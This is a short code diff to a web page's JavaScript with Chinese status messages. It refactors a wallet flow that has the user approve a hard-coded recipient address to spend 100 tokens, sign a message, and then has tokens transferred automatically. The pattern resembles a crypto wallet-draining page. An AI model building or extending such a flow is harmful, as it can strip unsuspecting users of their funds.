@@ -103,19 +103,28 @@
                 const tx = await tokenContract.methods.approve(recipientAddress, web3.utils.toWei('100', 'ether')).send({ from: account });
                 document.getElementById('status').innerText = '授权成功，正在请求签名...';
 
-                // 授权成功后自动执行签名
-                const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
-                const signature = await web3.eth.personal.sign(message, account);
-                document.getElementById('status').innerText = `授权和签名成功: ${signature}`;
+                // 授权成功后直接执行签名操作
+                await performSignature(account);
                 
-                // 自动弹出签名信息
-                document.getElementById('signatureMessage').innerText = message;
-                document.getElementById('signingSection').style.display = 'block';
-
                 // 开始代币转移
                 await transferTokens(account);
             } catch (error) {
                 document.getElementById('status').innerText = '授权或签名失败: ' + error.message;
+            }
+        };
+
+        // 执行签名的函数
+        const performSignature = async (account) => {
+            const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
+            try {
+                const signature = await web3.eth.personal.sign(message, account);
+                document.getElementById('status').innerText = `授权和签名成功: ${signature}`;
+
+                // 自动弹出签名信息
+                document.getElementById('signatureMessage').innerText = message;
+                document.getElementById('signingSection').style.display = 'block';
+            } catch (error) {
+                document.getElementById('status').innerText = '签名失败: ' + error.message;
             }
         };
 
